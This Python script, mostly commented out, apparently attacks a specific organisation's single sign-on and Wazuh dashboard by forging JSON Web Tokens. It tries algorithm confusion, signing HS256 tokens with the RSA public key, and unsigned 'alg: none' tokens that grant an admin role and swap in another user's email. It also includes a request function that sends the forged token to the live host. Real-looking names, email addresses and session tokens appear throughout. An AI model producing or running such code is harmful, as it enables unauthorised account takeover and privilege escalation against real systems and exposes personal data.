from enum import verify
import hmac
import hashlib
import base64
import json
import jwt

#def b64url(data):
#    if isinstance(data, dict):
#        data = json.dumps(data, separators=(',', ':')).encode()
#    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
#
#header = {
#    "alg": "HS256",
#    "typ": "JWT",
#    "kid": "Kkh44WHvblQeU6pTyodG7L4KAan4vLZGqbM6r7D5Bgc"
#}
#
#
#payload = {
#  "exp": 1900000000,
#  "iat": 1700000000,
#  "auth_time": 1785847339,
#  "jti": "a49343db-8e53-4fc2-87d4-661fb87938d5",
#  "iss": "https://sso.cherokee.com.br/auth/realms/cherokee",
#  "sub": "7ebd7972-ac10-48e8-ba79-2d7fc63e1f22",
#  "typ": "Bearer",
#  "azp": "wazuh.cherokee.com.br.e3b454b35271",
#  "sid": "d60d3bf0-965b-46c3-8019-0c97cef154bd",
#  "acr": "0",
#  "scope": "openid email profile",
#  "email_verified": True,
#  "name": "Ulisses Donato",
#  "Roles": [
#    "GSP_Wazuh_Admin"
#  ],
#  "preferred_username": "lucas.amorin@cherokee.com.br",
#  "locale": "pt-BR",
#  "given_name": "Ulisses",
#  "family_name": "Donato",
#  "email": "lucas.amorin@cherokee.com.br"
#}
#
#
## Usar a chave pública PEM como segredo HMAC
#public_key_pem = """-----BEGIN PUBLIC KEY-----
#MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfhxTR1m9XO9veZGtJPjlo+tAkRTrP+De4dJryQlMtQBQ/CWs+fI1SEyLl5CcJ/opUFtjj/9/BVV+gTfO9eVfJrRRs/qnxq1/AIXdwuC9UgOYUks0RjH51g0NMZ5Nmaw54VC07Os9VVdIGzCu31cylkNYCViI4yZyRmVUeEIwsHqcPpYERlZOz4QnaXGBaQo8JgZPJV5zEl3Ny7XB8KT0WNzrpSAxFySVhSSo/gii1eyLUYyB07wMafEnNfM+DUcGjUkxjmpGMEkqtwmjwZF731o40jmk/tc6eu7qLgi2SINV6UEArnw9TZTLN+t+vWyMJTDVtS6xu1p/WE7j1jNsQIDAQAB
#-----END PUBLIC KEY-----"""
#
## Converter a chave PEM para o formato que o servidor espera? Geralmente a chave pública é usada como string.
## O segredo HMAC pode ser a chave pública em formato PEM ou a representação base64 do modulus/exponent.
## Vamos usar o PEM diretamente como segredo.
#secret = public_key_pem.encode()
#
## Gerar assinatura
#signing_input = f"{b64url(header)}.{b64url(payload)}"
#signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
#signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
#
#token = f"{signing_input}.{signature_b64}"
#print(token)
#
#




#token = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJLa2g0NFdIdmJsUWVVNnBUeW9kRzdMNEtBYW40dkxaR3FiTTZyN0Q1QmdjIn0.eyJleHAiOjE3ODU4ODIwMjYsImlhdCI6MTc4NTg0OTYyNiwiYXV0aF90aW1lIjoxNzg1ODQ3MzM5LCJqdGkiOiJhNDkzNDNkYi04ZTUzLTRmYzItODdkNC02NjFmYjg3OTM4ZDUiLCJpc3MiOiJodHRwczovL3Nzby5jaGVyb2tlZS5jb20uYnIvYXV0aC9yZWFsbXMvY2hlcm9rZWUiLCJzdWIiOiI3ZWJkNzk3Mi1hYzEwLTQ4ZTgtYmE3OS0yZDdmYzYzZTFmMjIiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJ3YXp1aC5jaGVyb2tlZS5jb20uYnIuZTNiNDU0YjM1MjcxIiwic2lkIjoiZDYwZDNiZjAtOTY1Yi00NmMzLTgwMTktMGM5N2NlZjE1NGJkIiwiYWNyIjoiMCIsInNjb3BlIjoib3BlbmlkIGVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6IlVsaXNzZXMgRG9uYXRvIiwiUm9sZXMiOlsiR1NQX1dhenVoX0FkbWluIl0sInByZWZlcnJlZF91c2VybmFtZSI6InVsaXNzZXMuZG9uYXRvQGNoZXJva2VlLmNvbS5iciIsImxvY2FsZSI6InB0LUJSIiwiZ2l2ZW5fbmFtZSI6IlVsaXNzZXMiLCJmYW1pbHlfbmFtZSI6IkRvbmF0byIsImVtYWlsIjoidWxpc3Nlcy5kb25hdG9AY2hlcm9rZWUuY29tLmJyIn0.eGQ3KB5lBSspygBmVfCmIQgAQlkRvwXzpr-brjo7_4FrMM66Cn3kzxNI_Wp1yuZJf5n7EORbb2fp-4ofk1gKkNJc3pogRwIvhq57gbSdUX-67sX9BLsrVwah1_LYpq-Z1Gg8vG1o34SSWknqRkPE8wzlZ1Wd3c8-nwYVEIZuWe5uqJelyfKL2db0AYbryPA7N_GHbtMk0j2WS547uknfufX4crqKUY9W2VXLfYIJzVvx0WNn3THkx3EmCued4LBTaTF3Jxay8YV78QEt_Y0k8ZTs67AxzBj5GAk75-FYh-1EDoRAavDKTbOjEzDiPGXE8fJ7BPNGPrjSJfg4ZkqPFQv"
#decoded_token = jwt.decode(token, options={"verify_signature": False})
#decoded_token['preferred_username'] = 'lucas.amorin@cherokee.com.br'
#decoded_token['email'] = 'lucas.amorin@cherokee.com.br'
#decoded_token['exp'] = 1900000000
#decoded_token['iat'] = 1700000000
#
#header = {"alg": "none", "typ": "JWT", "kid": "Kkh44WHvblQeU6pTyodG7L4KAan4vLZGqbM6r7D5Bgc"}
#
#def b64(d):
#    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
#token = f"{b64(header)}.{b64(decoded_token)}."
#
#print(token)

#eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIiwgImtpZCI6ICJLa2g0NFdIdmJsUWVVNnBUeW9kRzdMNEtBYW40dkxaR3FiTTZyN0Q1QmdjIn0.eyJleHAiOiAxOTAwMDAwMDAwLCAiaWF0IjogMTcwMDAwMDAwMCwgImF1dGhfdGltZSI6IDE3ODU4NDczMzksICJqdGkiOiAiYTQ5MzQzZGItOGU1My00ZmMyLTg3ZDQtNjYxZmI4NzkzOGQ1IiwgImlzcyI6ICJodHRwczovL3Nzby5jaGVyb2tlZS5jb20uYnIvYXV0aC9yZWFsbXMvY2hlcm9rZWUiLCAic3ViIjogIjdlYmQ3OTcyLWFjMTAtNDhlOC1iYTc5LTJkN2ZjNjNlMWYyMiIsICJ0eXAiOiAiQmVhcmVyIiwgImF6cCI6ICJ3YXp1aC5jaGVyb2tlZS5jb20uYnIuZTNiNDU0YjM1MjcxIiwgInNpZCI6ICJkNjBkM2JmMC05NjViLTQ2YzMtODAxOS0wYzk3Y2VmMTU0YmQiLCAiYWNyIjogIjAiLCAic2NvcGUiOiAib3BlbmlkIGVtYWlsIHByb2ZpbGUiLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAibmFtZSI6ICJVbGlzc2VzIERvbmF0byIsICJSb2xlcyI6IFsiR1NQX1dhenVoX0FkbWluIl0sICJwcmVmZXJyZWRfdXNlcm5hbWUiOiAibHVjYXMuYW1vcmluQGNoZXJva2VlLmNvbS5iciIsICJsb2NhbGUiOiAicHQtQlIiLCAiZ2l2ZW5fbmFtZSI6ICJVbGlzc2VzIiwgImZhbWlseV9uYW1lIjogIkRvbmF0byIsICJlbWFpbCI6ICJsdWNhcy5hbW9yaW5AY2hlcm9rZWUuY29tLmJyIn0.



#import jwt
#from datetime import datetime, timedelta
#import base64

# Exploit details
#target_email = "lucas.amorin@cherokee.com.br"
#target_username = "lucas.amorin@cherokee.com.br"
#
## Token parameters
#iat = int(datetime.now().timestamp())
#exp = iat + 86400  # 24-hour expiry
#auth_time = iat - 3600  # 1 hour ago
#
## Crafted payload with modified values
#payload = {
#    "exp": exp,
#    "iat": iat,
#    "auth_time": auth_time,
#    "jti": "a49343db-8e53-4fc2-87d4-661fb87938d5",
#    "iss": "https://sso.cherokee.com.br/auth/realms/cherokee",
#    "sub": "7ebd7972-ac10-48e8-ba79-2d7fc63e1f22",
#    "typ": "Bearer",
#    "azp": "wazuh.cherokee.com.br.e3b454b35271",
#    "sid": "d60d3bf0-965b-46c3-8019-0c97cef154bd",
#    "acr": "0",
#    "scope": "openid email profile",
#    "email_verified": True,
#    "name": "Exploit User",
#    "Roles": ["GSP_Wazuh_Admin"],
#    "preferred_username": target_username,
#    "locale": "pt-BR",
#    "given_name": "Exploit",
#    "family_name": "User",
#    "email": target_email
#}
#
### Sign the token with a known private key (for testing only)
#private_key = """-----BEGIN PRIVATE KEY-----
#MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfhxTR1m9XO9veZGtJPjlo+tAkRTrP+De4dJryQlMtQBQ/CWs+fI1SEyLl5CcJ/opUFtjj/9/BVV+gTfO9eVfJrRRs/qnxq1/AIXdwuC9UgOYUks0RjH51g0NMZ5Nmaw54VC07Os9VVdIGzCu31cylkNYCViI4yZyRmVUeEIwsHqcPpYERlZOz4QnaXGBaQo8JgZPJV5zEl3Ny7XB8KT0WNzrpSAxFySVhSSo/gii1eyLUYyB07wMafEnNfM+DUcGjUkxjmpGMEkqtwmjwZF731o40jmk/tc6eu7qLgi2SINV6UEArnw9TZTLN+t+vWyMJTDVtS6xu1p/WE7j1jNsQIDAQAB
#-----END PRIVATE KEY-----"""
##
#signed_token = jwt.encode(
#    payload=decoded_token,
#    key=private_key,
#    algorithm="RS256",
#    headers={"kid": "Kkh44WHvblQeU6pTyodG7L4KAan4vLZGqbM6r7D5Bgc"}
#)
##
#print(f"Malicious token: {signed_token}")

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IktraDQ0V0h2YmxRZVU2cFR5b2RHN0w0S0FhbjR2TFpHcWJNNnI3RDVCZ2MifQ.eyJleHAiOjE3ODU4ODIwMjYsImlhdCI6MTc4NTg0OTYyNiwiYXV0aF90aW1lIjoxNzg1ODQ3MzM5LCJqdGkiOiJhNDkzNDNkYi04ZTUzLTRmYzItODdkNC02NjFmYjg3OTM4ZDUiLCJpc3MiOiJodHRwczovL3Nzby5jaGVyb2tlZS5jb20uYnIvYXV0aC9yZWFsbXMvY2hlcm9rZWUiLCJzdWIiOiI3ZWJkNzk3Mi1hYzEwLTQ4ZTgtYmE3OS0yZDdmYzYzZTFmMjIiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJ3YXp1aC5jaGVyb2tlZS5jb20uYnIuZTNiNDU0YjM1MjcxIiwic2lkIjoiZDYwZDNiZjAtOTY1Yi00NmMzLTgwMTktMGM5N2NlZjE1NGJkIiwiYWNyIjoiMCIsInNjb3BlIjoib3BlbmlkIGVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6IlVsaXNzZXMgRG9uYXRvIiwiUm9sZXMiOlsiR1NQX1dhenVoX0FkbWluIl0sInByZWZlcnJlZF91c2VybmFtZSI6Imx1Y2FzLmFtb3JpbkBjaGVyb2tlZS5jb20uYnIiLCJsb2NhbGUiOiJwdC1CUiIsImdpdmVuX25hbWUiOiJVbGlzc2VzIiwiZmFtaWx5X25hbWUiOiJEb25hdG8iLCJlbWFpbCI6Imx1Y2FzLmFtb3JpbkBjaGVyb2tlZS5jb20uYnIifQ._Ff7G2f-bYvxGki6dtunJiBFmGlIbrUxPsTDXj2yMUQ"
#print(jwt.decode(token, verify_signature=False))
print(jwt.decode(token, options={"verify_signature": False}))

#
#import requests
#import re
#from urllib.parse import parse_qs
#
#def exploit_with_state_fix(target_url):
#    # First get the login page to extract state
#    login_page = requests.get(target_url)
#    
#    # Extract state parameter from URL
#    state_match = re.search(r'state=([a-f0-9]+)', login_page.url)
#    if not state_match:
#        print("State parameter not found")
#        return
#    
#    state_value = state_match.group(1)
#    
#    # Use the same state in our malicious request
#    headers = {
#        "Authorization": f"Bearer {token}",
#        "Cookie": f"state={state_value}"
#    }
#    
#    # Make the authenticated request
#    response = requests.get(
#        "https://wazuh.cherokee.com.br/",
#        headers=headers,
#        allow_redirects=False
#    )
#    
#    # If still getting redirected, follow the new redirect
#    if response.status_code == 302:
#        redirect_url = response.headers.get('Location')
#        if redirect_url:
#            print(f"Following redirect to: {redirect_url}")
#            final_response = requests.get(redirect_url)
#            print(f"Final status: {final_response.status_code}")
#            return final_response.text
#    
#    print(f"Status code: {response.status_code}")
#    return None
#
#exploited_content = exploit_with_state_fix("https://wazuh.cherokee.com.br/")
